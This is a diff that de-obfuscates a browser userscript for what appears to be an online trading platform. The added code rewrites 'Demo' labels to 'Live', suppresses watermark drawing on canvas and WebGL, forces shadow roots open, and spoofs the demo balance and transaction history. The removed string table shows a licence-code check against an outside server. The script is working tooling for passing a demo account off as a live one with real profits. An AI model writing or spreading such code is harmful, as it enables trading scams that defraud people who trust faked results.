@@ -1,1075 +1,632 @@
-var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "matches", "innerWidth", "_2", "length", "pop", "_3", "querySelectorAll", "*", "_4", "_5", "shadowRoot", "__zeroxShadowRoot", "includes", "push", "_6", "closest", "3ekBp.lebal", "nBtDR.il", "DBOrg.vid", "ljI0p.vid", "bZ4EQ.vid", "lebal", "_7", "querySelector", "]\"oidar\"=epyt[tupni", "_8", "value", "toLowerCase", "omed", "]\"tide\"=*ssalc[ ,nottub ,]\"hserfer\"=*ssalc[gvs", "_9", "vid ,]\"meti\"=*ssalc[vid ,il", "textContent", "tnuoccA omeD", "_10", "getOwnPropertyDescriptor", "prototype", "tnetnoCtxet", "set", "defineProperty", "gnirts", "omeD", "OMED", "call", "replace", "tnuoccA eviL", "eviL", "EVIL", "evil", "get", "txeTrenni", "appendChild", "denifednu", "__zeroxOrigAttach", "attachShadow", "nepo", "__zeroxEarlyContextPatched", "_14", "getContext", "lgbew", "2lgbew", "lgbew-latnemirepxe", "apply", "d2", "d2-latnemirepxe", "__zeroxWatermarkBlocked", "stroke", "globalAlpha", "fill", "__zeroxProtoWatermarkBlocked", "__zeroxWebGlDrawPatched", "drawElements", "qxLiveObserver", "disconnect", "qxLiveFix", "qxUrlForceInterval", "qxBalanceInterval", "qxProfitLine", "qxDemoBalanceFixInterval", "getElementById", "elyts-denibmoc-xq", "remove", "elyts-xif-tod-xq", "tsoh-reganam-xq", "reniatnoc-ladom-reganam-xq", "gb-nidahs", "omed-deined-ssecca", "elyts-omed-deined-ssecca", "omed-nidahs", "elyts-omed-nidahs", "elyts-enil-tiforp-xq", "2v_gifnoc_lenap_x0_xq", "_18", "_19", "1v_gifnoc_lenap_x0_xq", "_20", "_21", "tcejbo", "spoofDemoBalance", "isArray", "transactions", "_23", "getItem", "parse", "emaNmotsuc", "yrtnuoc", "galFyrtnuoc", "latipaCgnitrats", "tesffOtiforp", "ratavAmotsuc", "setItem", "stringify", "_26", "_28", "assign", "$", "toLocaleString", "SU-ne", "teseRecnalaBomed", "1", "ecnalaBomed", "trim", "isFinite", "vid ,naps ,]\"yenom\"=*ssalc[ ,]\"tnuoma\"=*ssalc[ ,]\"ecnalab\"=*ssalc[ ,gnorts ,b ,]\"0TonY\"=*ssalc[b ,0TonY.b", "filter", "le-giro-edih-xq.", "children", "test", "_32", "_33", "dataset", "qxOrigDemoText", "setAttribute", "ecnalab-omed-xq-atad", "qxOrigLiveText", "ecnalab-evil-decnys-xq-atad", "_34", "createTreeWalker", "SHOW_TEXT", "_35", "nextNode", "nodeValue", "parentElement", "_36", "_37", "body", "_38", "_40", "getAttribute", "elor", "tagName", "IL", "metiunem", "noitpo", "_42", "isConnected", "ladoMxTxq# ,ladoMscitylanAxq# ,pupoPsgnittes#", "_43", "]\"tnuocca\"=*ssalc[lu ,ljI0p. ,DBOrg.", "forEach", "]\"nBTdR\"=*ssalc[il ,nBtDR.il", "_44", "vid ,]\"revopop\"=*ssalc[ ,]\"unem\"=*ssalc[ ,]\"nwodpord\"=*ssalc[ ,]\"unem\"=elor[ ,lu", "_45", "reggirt-unemresu-xq", "]\"ecnalab\"=*ssalc[ ,ecnalab.", "_49", "_50", "match", "_52", "naps redaeh ,vid redaeh ,XPK2v. ,Gh1tz. ,XPK2v. redaeh ,Gh1tz. redaeh", "]\"unem\"=elor[ ,lu ,ladoMxTxq# ,ladoMscitylanAxq# ,pupoPsgnittes#", "qxSyncedLiveBalance", "_55", "_56", "_58", "_59", "_63", "_64", "_65", "_66", "_68", "_70", "_72", "_74", "_75", "_76", "_77", "_79", "_81", "qxDemoBalanceEventsBound", "detadpu-ecnalab-omed:xq", "teser-ecnalab-omed:xq", "detadpu-snoitcasnart:xq", "addEventListener", "moc.rednerno.edocevilxetouqmuimerpxorez//:sptth", "edart", "_84", "location", "href", "history", "replaceState", "state", "_85", "title", "qxHistoryPatched", "pushState", "_87", "_89", "_90", "_91", "etatspop", "_92", "_93", "_94", "_96", "XPK2v. ,naps redaeh ,vid redaeh ,Gh1tz.", "_100", "edisa ,noitces ,vid", "_102", "sunob %05", "tisoped ruoy no sunob", "%05 a teG", "offsetHeight", "style", "setProperty", "yalpsid", "enon", "tnatropmi", "_104", "qxCustomStartingCapital", "toString", "0", "qxCustomName", "maeT X redarT", "qxCustomCountry", "hsedalgnaB", "_105", "db", "ni", "su", "bg", "ac", "ua", "ea", "as", "kp", "_106", "createElement", "elyts", "id", "head", "_107", "vid", "find", "innerText", ":noitisop ruoY", "getBoundingClientRect", "width", "height", "classList", "add", "drac-tiforp-xq", "enil-tiforp-xq.", "className", "enil-tiforp-xq", "abs", "%0", "background", "95faf0#", "_114", "max", "min", "%", "_117", "naps,vid", "-", "+001", "_120", "_122", "noitisop ruoY", "_124", "_125", "_130", "_131", "_132", "_134", "_135", "rt,il,vid", "contains", " ", "_138", "_139", "_140", "|", "has", "sort", "rank", "_141", "amount", "_142", "_144", "_145", "_150", "_153", "_154", "draoB redaeL", "_155", "_156", "naps ,vid", "startsWith", ".", "roloc", "4444fe#", "seod woH", "yaD eht fo", "vid ,]\"meti\"=*ssalc[vid", "galf-draobredael-xq.", "gmi", "galf-draobredael-xq", "src", "parentNode", "insertBefore", "display", "kcolb-enilni", "TNUOCCA EVIL", "_165", "p ,a ,naps ,vid", "childNodes", "nodeType", "TEXT_NODE", "_166", "tnuocca omeD", "edart-omed", "color", "fontWeight", "009", "fontSize", "xp01", "lineHeight", "2.1", "getPropertyValue", "]\"evil\"=eulav[]\"oidar\"=epyt[tupni", "checked", "_168", "fvFJy.", "_169", "htdiw", "xp02", "thgieh", "roloc-redrob", "ed5dfc#", "roloc-dnuorgkcab", "tnerapsnart", "yticapo", "ytilibisiv", "elbisiv", "EzgUR.", "_170", "xp21", "htdiw-nim", "thgieh-nim", "redrob", "ffffff#", "wodahs-xob", "_171", "naps", "EzgUR", "fvFJy", "]\"omed\"=eulav[]\"oidar\"=epyt[tupni", "6a0aa9#", "_175", "xp0", "_176", "piv-level-eliforp-noci", ":piv", "tiforp %4+", "orp-level-eliforp-noci", ":orp", "tiforp %2+", "tradnats-level-eliforp-noci", ":dradnats", "tiforp %0+", "iconId", "_178", "gvs H6mKn.", "ssalc", "_179", "esu", "ferh", "ferh:knilx", "innerHTML", "ZlGjq.", "label", "lLpgV.", "profit", "_180", "XPK2v.", "toUpperCase", ")noci-level-xq.(ton:gvs ,cimedaca-noci.gvs", "_184", "#gvs.pametirps/segami/eliforp/", "noci-level-xq.", "_185", "createElementNS", "gvs/0002/gro.3w.www//:ptth", "gvs", "noci-level-xq", "xoBweiv", "42 42 0 0", "firstChild", "htdiw-xam", "thgieh-xam", "xelf", "xp02 0 0", "tfel-nigram", "thgir-nigram", "xp4", "ezis-tnof", "thgiew-tnof", "thgieh-enil", "xp61", "xp61 0 0", "xp01-", "xp8", "_187", "_189", "_190", "createTextNode", "nextSibling", "_191", "xelf-enilni", "noitcerid-xelf", "nmuloc", "smeti-ngila", "trats-xelf", "tnetnoc-yfitsuj", "retnec", "_192", "REDAEH", "wor", "pag", "_193", "_194", " EVIL", "00.0$", "_197", "tes ton si timil yliad ehT", "_198", "_199", "vid ,naps", "_200", "previousElementSibling", "_202", "_203", "ecnalab.", "_205", "00.000,01$", "_210", "_211", "toor.", "alignItems", "flexDirection", "gap", "_212", "txet.", "justifyContent", "epyt-fo-tsrif:gvs ,noci.gvs", "marginLeft", "_214", "outerHTML", "noci.gvs", "insertAdjacentHTML", "nigebretfa", "]\"eman\"=*ssalc[vid ,eman.", "_215", "_216", "]\"ecnalab\"=*ssalc[vid ,ecnalab.", "82.1", "xp41", "007", "attributes", "name", "_218", "replaceChild", "a ,naps ,vid", "_219", "eziser", "_220", "_222", "addedNodes", "ELEMENT_NODE", "observe", "_224", "drac.", "_226", "esolc.", "egassem.", "tupni stupni.", "_228", "kcilc", "preventDefault", "stopPropagation", "edoc tcerroc eht retnE", "888#", "target", "every", "map", "_229", "3652", "sseccus", "deifireV \u2713", "edih", "ekahs", "offsetWidth", "edoc gnorW", "f3747e#", "focus", "tupni", "nwodyek", "key", "ecapskcaB", "tfeLworrA", "thgiRworrA", "etsap", "clipboardData", "getData", "txet", "slice", "_230", "TSOP", "nosj/noitacilppa", "json", "_232", "code", "valid", "warn", ".esnopser dnekcab ni dnuof ton edoc eroC", "error", ":rorre daol tceriD", "log", "!)xoB laeR & nocI 02x02 tcaxE( evitcA xiF draobredaeL & drauG eltiT ,redaoL eruceS muimerP X0"];
+/**
+ * 0X Premium Secure Loader, Live Customizer & Title Guard Script (Real PC Box & 20x20 Icon)
+ */
+
 (async function () {
   'use strict';
 
-  function _1n6() {
-    return window[_0[0]](_0[1][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[6]] && window[_0[7]] >= (337509 ^ 337252);
+  function isDesktopView() {
+    return window.matchMedia('(min-width: 769px)').matches && window.innerWidth >= 769;
   }
-  function _1n7(root = document) {
-    var _ = function (s, h) {
-      return s + h;
-    }(398990 ^ 398990, 443957 ^ 443959);
-    const _1 = [root];
-    _ = (917087 ^ 917087) + (491676 ^ 491676);
-    var _2 = _0[8];
-    const _a = [root];
-    _2 = function () {
-      return _0[8];
-    }();
-    while (_a[_0[9]]) {
-      var _3 = function (s, h) {
-        return s ^ h;
-      }(707447, 707445);
-      const _b = _a[_0[10]]();
-      _3 = function () {
-        return _0[11];
-      }();
-      var _4 = function (s, h) {
-        return s + h;
-      }(505351 ^ 505351, 159908 ^ 159905);
-      const _c = _b[_0[12]] ? _b[_0[12]](_0[13]) : [];
-      _4 = function () {
-        return _0[14];
-      }();
-      for (const el of _c) {
-        var _5 = _0[15];
-        const sr = el[_0[16]] || el[_0[17]];
-        _5 = function () {
-          return _0[15];
-        }();
-        if (sr && !_1[_0[18]](sr)) {
-          _1[_0[19]](sr);
-          _a[_0[19]](sr);
+
+  function getAllRoots(root = document) {
+    const roots = [root];
+    const stack = [root];
+    while (stack.length) {
+      const current = stack.pop();
+      const nodes = current.querySelectorAll ? current.querySelectorAll('*') : [];
+      for (const el of nodes) {
+        const sr = el.shadowRoot || el.__zeroxShadowRoot;
+        if (sr && !roots.includes(sr)) {
+          roots.push(sr);
+          stack.push(sr);
         }
       }
     }
-    return _1;
+    return roots;
   }
-  function _1n8(selector, root = document) {
-    var _6 = function (s, h) {
-      return s + h;
-    }(592205 ^ 592205, 594322 ^ 594324);
-    const _d = [];
-    _6 = function () {
-      return _0[20];
-    }();
-    for (const r of _1n7(root)) {
-      if (r[_0[12]]) {
-        _d[_0[19]](...r[_0[12]](selector));
+
+  function queryAllDeep(selector, root = document) {
+    const results = [];
+    for (const r of getAllRoots(root)) {
+      if (r.querySelectorAll) {
+        results.push(...r.querySelectorAll(selector));
       }
     }
-    return _d;
+    return results;
   }
-  function _1n9(el) {
-    if (!el || !el[_0[21]]) return ![];
-    return Boolean(el[_0[21]](_0[22][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || el[_0[21]](_0[23][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || el[_0[21]](_0[24][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || el[_0[21]](_0[25][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || el[_0[21]](_0[26][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])));
+
+  function isDropdownAccountLabel(el) {
+    if (!el || !el.closest) return false;
+    return Boolean(
+      el.closest('label.pBke3') ||
+      el.closest('li.RDtBn') ||
+      el.closest('div.grOBD') ||
+      el.closest('div.p0Ijl') ||
+      el.closest('div.QE4Zb')
+    );
   }
-  function _1na(el) {
-    if (!el) return ![];
-    var _7 = function (s, h) {
-      return s + h;
-    }(888192 ^ 888198, 158648 ^ 158651);
-    const _e = el[_0[21]] ? el[_0[21]](_0[27][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) : null;
-    _7 = function () {
-      return _0[28];
-    }();
-    if (_e) {
-      var _8 = function (s, h) {
-        return s + h;
-      }(355614 ^ 355613, 148532 ^ 148529);
-      const _g = _e[_0[29]](_0[30][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _8 = function () {
-        return _0[31];
-      }();
-      if (_g && _g[_0[32]] && _g[_0[32]][_0[33]]() === _0[34][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-        return !![];
+
+  function isDemoAccountRowElement(el) {
+    if (!el) return false;
+    const label = el.closest ? el.closest('label') : null;
+    if (label) {
+      const radio = label.querySelector('input[type="radio"]');
+      if (radio && radio.value && radio.value.toLowerCase() === 'demo') {
+        return true;
       }
-      if (_e[_0[29]](_0[35][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-        return !![];
+      if (label.querySelector('svg[class*="refresh"], button, [class*="edit"]')) {
+        return true;
       }
     }
-    var _9 = _0[36];
-    const _h = el[_0[21]] ? el[_0[21]](_0[37][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) : null;
-    _9 = function () {
-      return _0[36];
-    }();
-    if (_h && (_h[_0[38]] || _0[3])[_0[18]](_0[39][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-      return !![];
+    const row = el.closest ? el.closest('li, div[class*="item"], div') : null;
+    if (row && (row.textContent || '').includes('Demo Account')) {
+      return true;
     }
-    return ![];
+    return false;
   }
+
+  // --- 1. ULTIMATE ANTI-DEMO PROPERTY INTERCEPTOR ---
   (function antiDemoLock() {
     try {
-      var _10 = _0[40];
-      const _i = Object[_0[41]](Node[_0[42]], _0[43][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _10 = function () {
-        return 130010 ^ 130003;
-      }();
-      if (_i && _i[_0[44]]) {
-        Object[_0[45]](Node[_0[42]], _0[43][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), {
-          set: function (value) {
-            if (typeof value === _0[46][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && (value[_0[18]](_0[47][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || value[_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])))) {
-              if (_1n9(this) && _1na(this)) {
-                return _i[_0[44]][_0[49]](this, value);
+      const textConDesc = Object.getOwnPropertyDescriptor(Node.prototype, 'textContent');
+      if (textConDesc && textConDesc.set) {
+        Object.defineProperty(Node.prototype, 'textContent', {
+          set: function(value) {
+            if (typeof value === 'string' && (value.includes('Demo') || value.includes('DEMO'))) {
+              if (isDropdownAccountLabel(this) && isDemoAccountRowElement(this)) {
+                return textConDesc.set.call(this, value);
               }
-              value = value[_0[50]](/Demo Account/g, _0[51][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/Demo/g, _0[52][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/DEMO/g, _0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/demo/g, _0[54][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
+              value = value.replace(/Demo Account/g, 'Live Account')
+                           .replace(/Demo/g, 'Live')
+                           .replace(/DEMO/g, 'LIVE')
+                           .replace(/demo/g, 'live');
             }
-            return _i[_0[44]][_0[49]](this, value);
+            return textConDesc.set.call(this, value);
           },
-          get: _i[_0[55]]
+          get: textConDesc.get
         });
       }
-      var _11 = function (s, h) {
-        return s + h;
-      }(796158 ^ 796152, 382211 ^ 382213);
-      const _j = Object[_0[41]](HTMLElement[_0[42]], _0[56][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _11 = (838196 ^ 838192) + (254021 ^ 254022);
-      if (_j && _j[_0[44]]) {
-        Object[_0[45]](HTMLElement[_0[42]], _0[56][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), {
-          set: function (value) {
-            if (typeof value === _0[46][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && (value[_0[18]](_0[47][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || value[_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])))) {
-              if (_1n9(this) && _1na(this)) {
-                return _j[_0[44]][_0[49]](this, value);
+
+      const innerTextDesc = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerText');
+      if (innerTextDesc && innerTextDesc.set) {
+        Object.defineProperty(HTMLElement.prototype, 'innerText', {
+          set: function(value) {
+            if (typeof value === 'string' && (value.includes('Demo') || value.includes('DEMO'))) {
+              if (isDropdownAccountLabel(this) && isDemoAccountRowElement(this)) {
+                return innerTextDesc.set.call(this, value);
               }
-              value = value[_0[50]](/Demo Account/g, _0[51][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/Demo/g, _0[52][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/DEMO/g, _0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/demo/g, _0[54][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
+              value = value.replace(/Demo Account/g, 'Live Account')
+                           .replace(/Demo/g, 'Live')
+                           .replace(/DEMO/g, 'LIVE')
+                           .replace(/demo/g, 'live');
             }
-            return _j[_0[44]][_0[49]](this, value);
+            return innerTextDesc.set.call(this, value);
           },
-          get: _j[_0[55]]
+          get: innerTextDesc.get
         });
       }
-      var _12 = function (s, h) {
-        return s ^ h;
-      }(970307, 970311);
-      const _k = Element[_0[42]][_0[57]];
-      _12 = (412308 ^ 412308) + (282530 ^ 282531);
-      Element[_0[42]][_0[57]] = function (child) {
-        if (child && child[_0[38]]) {
-          if (!(_1n9(this) && _1na(this))) {
-            if (child[_0[38]][_0[18]](_0[47][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) || child[_0[38]][_0[18]](_0[48][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-              child[_0[38]] = child[_0[38]][_0[50]](/Demo/g, _0[52][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/DEMO/g, _0[53][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/demo/g, _0[54][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
+
+      const origAppend = Element.prototype.appendChild;
+      Element.prototype.appendChild = function(child) {
+        if (child && child.textContent) {
+          if (!(isDropdownAccountLabel(this) && isDemoAccountRowElement(this))) {
+            if (child.textContent.includes('Demo') || child.textContent.includes('DEMO')) {
+              child.textContent = child.textContent.replace(/Demo/g, 'Live').replace(/DEMO/g, 'LIVE').replace(/demo/g, 'live');
             }
           }
         }
-        return _k[_0[49]](this, child);
+        return origAppend.call(this, child);
       };
-      if (typeof Element !== _0[58][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && !Element[_0[42]][_0[59]]) {
-        Element[_0[42]][_0[59]] = Element[_0[42]][_0[60]];
-        Element[_0[42]][_0[60]] = function (init) {
-          var _13 = function (s, h) {
-            return s + h;
-          }(951782 ^ 951780, 837636 ^ 837638);
-          const _l = Element[_0[42]][_0[59]][_0[49]](this, {
-            ...init,
-            mode: _0[61][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
-          });
-          _13 = function () {
-            return 689176 ^ 689182;
-          }();
-          this[_0[17]] = _l;
-          return _l;
+
+      if (typeof Element !== 'undefined' && !Element.prototype.__zeroxOrigAttach) {
+        Element.prototype.__zeroxOrigAttach = Element.prototype.attachShadow;
+        Element.prototype.attachShadow = function(init) {
+          const shadow = Element.prototype.__zeroxOrigAttach.call(this, { ...init, mode: 'open' });
+          this.__zeroxShadowRoot = shadow;
+          return shadow;
         };
       }
-    } catch (e) {}
+    } catch(e) {}
   })();
+
+  // --- 2. EARLY UNIVERSAL WATERMARK & DEMO TEXT INTERCEPTOR ---
   (function earlyPatch() {
     try {
-      if (typeof HTMLCanvasElement !== _0[58][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && !HTMLCanvasElement[_0[42]][_0[62]]) {
-        HTMLCanvasElement[_0[42]][_0[62]] = function () {
-          return !![];
-        }();
-        var _14 = _0[63];
-        const _m = HTMLCanvasElement[_0[42]][_0[64]];
-        _14 = (736893 ^ 736892) + (357474 ^ 357478);
-        HTMLCanvasElement[_0[42]][_0[64]] = function (type) {
-          if (type === _0[65][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || type === _0[66][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || type === _0[67][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
+      if (typeof HTMLCanvasElement !== 'undefined' && !HTMLCanvasElement.prototype.__zeroxEarlyContextPatched) {
+        HTMLCanvasElement.prototype.__zeroxEarlyContextPatched = true;
+        const origGetContext = HTMLCanvasElement.prototype.getContext;
+        HTMLCanvasElement.prototype.getContext = function(type) {
+          if (type === 'webgl' || type === 'webgl2' || type === 'experimental-webgl') {
             return null;
           }
-          var _15 = function (s, h) {
-            return s + h;
-          }(883831 ^ 883829, 368703 ^ 368695);
-          const _n = _m[_0[68]](this, arguments);
-          _15 = (805630 ^ 805622) + (955044 ^ 955053);
-          if (_n && (type === _0[69][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || type === _0[70][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) {
-            if (!_n[_0[71]]) {
-              _n[_0[71]] = function () {
-                return !![];
-              }();
-              const _s = _n[_0[72]];
-              _n[_0[72]] = function (path) {
-                if (_n[_0[73]] > (828259 ^ 828259) && _n[_0[73]] < 0.12) return;
-                return path ? _s[_0[49]](_n, path) : _s[_0[49]](_n);
+          const ctx = origGetContext.apply(this, arguments);
+          if (ctx && (type === '2d' || type === 'experimental-2d')) {
+            if (!ctx.__zeroxWatermarkBlocked) {
+              ctx.__zeroxWatermarkBlocked = true;
+              const _s = ctx.stroke;
+              ctx.stroke = function(path) {
+                if (ctx.globalAlpha > 0 && ctx.globalAlpha < 0.12) return;
+                return path ? _s.call(ctx, path) : _s.call(ctx);
               };
-              const _f = _n[_0[74]];
+              const _f = ctx.fill;
               if (_f) {
-                _n[_0[74]] = function (path) {
-                  if (_n[_0[73]] > (757368 ^ 757368) && _n[_0[73]] < 0.12) return;
-                  return path ? _f[_0[49]](_n, path) : _f[_0[49]](_n);
+                ctx.fill = function(path) {
+                  if (ctx.globalAlpha > 0 && ctx.globalAlpha < 0.12) return;
+                  return path ? _f.call(ctx, path) : _f.call(ctx);
                 };
               }
             }
           }
-          return _n;
+          return ctx;
         };
       }
-      if (typeof CanvasRenderingContext2D !== _0[58][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && !CanvasRenderingContext2D[_0[42]][_0[75]]) {
-        CanvasRenderingContext2D[_0[42]][_0[75]] = function () {
-          return !![];
-        }();
-        var _16 = function (s, h) {
-          return s + h;
-        }(732580 ^ 732583, 308615 ^ 308609);
-        const _o = CanvasRenderingContext2D[_0[42]][_0[72]];
-        _16 = (479366 ^ 479362) + (692032 ^ 692041);
-        CanvasRenderingContext2D[_0[42]][_0[72]] = function (path) {
-          if (this[_0[73]] > (204998 ^ 204998) && this[_0[73]] < 0.12) return;
-          return path ? _o[_0[49]](this, path) : _o[_0[49]](this);
+      if (typeof CanvasRenderingContext2D !== 'undefined' && !CanvasRenderingContext2D.prototype.__zeroxProtoWatermarkBlocked) {
+        CanvasRenderingContext2D.prototype.__zeroxProtoWatermarkBlocked = true;
+        const protoS = CanvasRenderingContext2D.prototype.stroke;
+        CanvasRenderingContext2D.prototype.stroke = function(path) {
+          if (this.globalAlpha > 0 && this.globalAlpha < 0.12) return;
+          return path ? protoS.call(this, path) : protoS.call(this);
         };
-        var _17 = function (s, h) {
-          return s ^ h;
-        }(623093, 623089);
-        const _p = CanvasRenderingContext2D[_0[42]][_0[74]];
-        _17 = function () {
-          return 653932 ^ 653932;
-        }();
-        if (_p) {
-          CanvasRenderingContext2D[_0[42]][_0[74]] = function (path) {
-            if (this[_0[73]] > (125367 ^ 125367) && this[_0[73]] < 0.12) return;
-            return path ? _p[_0[49]](this, path) : _p[_0[49]](this);
+        const protoF = CanvasRenderingContext2D.prototype.fill;
+        if (protoF) {
+          CanvasRenderingContext2D.prototype.fill = function(path) {
+            if (this.globalAlpha > 0 && this.globalAlpha < 0.12) return;
+            return path ? protoF.call(this, path) : protoF.call(this);
           };
         }
       }
       function patchGl(proto) {
-        if (!proto || proto[_0[76]]) return;
-        proto[_0[76]] = function () {
-          return !![];
-        }();
-        const _q = proto[_0[77]];
-        proto[_0[77]] = function (mode, count, type, offset) {
-          if (count === (476334 ^ 475648) || count > (651837 ^ 651837) && count % (284616 ^ 282982) === (759488 ^ 759488) && count <= (633886 ^ 650962)) return;
-          return _q[_0[68]](this, arguments);
+        if (!proto || proto.__zeroxWebGlDrawPatched) return;
+        proto.__zeroxWebGlDrawPatched = true;
+        const _de = proto.drawElements;
+        proto.drawElements = function(mode, count, type, offset) {
+          if (count === 1710 || (count > 0 && count % 1710 === 0 && count <= 17100)) return;
+          return _de.apply(this, arguments);
         };
       }
-      if (typeof WebGLRenderingContext !== _0[58][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) patchGl(WebGLRenderingContext[_0[42]]);
-      if (typeof WebGL2RenderingContext !== _0[58][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) patchGl(WebGL2RenderingContext[_0[42]]);
-    } catch (e) {}
+      if (typeof WebGLRenderingContext !== 'undefined') patchGl(WebGLRenderingContext.prototype);
+      if (typeof WebGL2RenderingContext !== 'undefined') patchGl(WebGL2RenderingContext.prototype);
+    } catch(e) {}
   })();
-  window[_0[78]]?.[_0[79]]();
-  clearInterval(window[_0[80]]);
-  clearInterval(window[_0[81]]);
-  clearInterval(window[_0[82]]);
-  clearInterval(window[_0[83]]);
-  clearInterval(window[_0[84]]);
-  window[_0[83]] = null;
-  document[_0[85]](_0[86][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[88][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[89][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[90][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[91][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[92][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[93][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[94][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[95][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  document[_0[85]](_0[96][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))?.[_0[87]]();
-  var _18 = function (s, h) {
-    return s + h;
-  }(146701 ^ 146703, 369375 ^ 369374);
-  const _r = _0[97][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _18 = function () {
-    return _0[98];
-  }();
-  var _19 = _0[99];
-  const _t = _0[100][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _19 = function () {
-    return _0[99];
-  }();
-  var _20 = function (s, h) {
-    return s + h;
-  }(924787 ^ 924784, 249089 ^ 249091);
-  const _u = function (s, h) {
-    return s ^ h;
-  }(976810, 966842);
-  _20 = function () {
-    return _0[101];
-  }();
-  var _21 = _0[102];
-  const _v = {
+
+  // --- 3. CLEANUP PREVIOUS INSTANCES ---
+  window.qxLiveObserver?.disconnect();
+  clearInterval(window.qxLiveFix);
+  clearInterval(window.qxUrlForceInterval);
+  clearInterval(window.qxBalanceInterval);
+  clearInterval(window.qxDemoBalanceFixInterval);
+
+  document.getElementById('qx-combined-style')?.remove();
+  document.getElementById('qx-dot-fix-style')?.remove();
+  document.getElementById('qx-manager-host')?.remove();
+  document.getElementById('qx-manager-modal-container')?.remove();
+  document.getElementById('shadin-bg')?.remove();
+  document.getElementById('access-denied-demo')?.remove();
+  document.getElementById('access-denied-demo-style')?.remove();
+  document.getElementById("shadin-demo")?.remove();
+  document.getElementById("shadin-demo-style")?.remove();
+
+  // --- 3B. LIVE & DEMO ACCOUNT BALANCE SYNC HELPER ---
+  const DEMO_STORAGE_KEY = 'qx_0x_panel_config_v2';
+  const DEMO_LEGACY_STORAGE_KEY = 'qx_0x_panel_config_v1';
+  const DEFAULT_DEMO_BALANCE = 10000;
+
+  const defaultDemoConfig = {
     spoofDemoBalance: null,
     transactions: []
   };
-  _21 = function () {
-    return _0[102];
-  }();
-  function _1nb(cfg) {
-    var _22 = function (s, h) {
-      return s + h;
-    }(772502 ^ 772510, 542270 ^ 542263);
-    const _w = {};
-    _22 = function () {
-      return 745253 ^ 745255;
-    }();
-    if (cfg && typeof cfg === _0[103][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-      if (cfg[_0[104]] !== undefined) _w[_0[104]] = cfg[_0[104]];
-      if (Array[_0[105]](cfg[_0[106]])) _w[_0[106]] = cfg[_0[106]];
+
+  function sanitizePersistedConfig(cfg) {
+    const out = {};
+    if (cfg && typeof cfg === 'object') {
+      if (cfg.spoofDemoBalance !== undefined) out.spoofDemoBalance = cfg.spoofDemoBalance;
+      if (Array.isArray(cfg.transactions)) out.transactions = cfg.transactions;
     }
-    return _w;
+    return out;
   }
-  function _1nc() {
+
+  function loadDemoConfig() {
     try {
-      var _23 = _0[107];
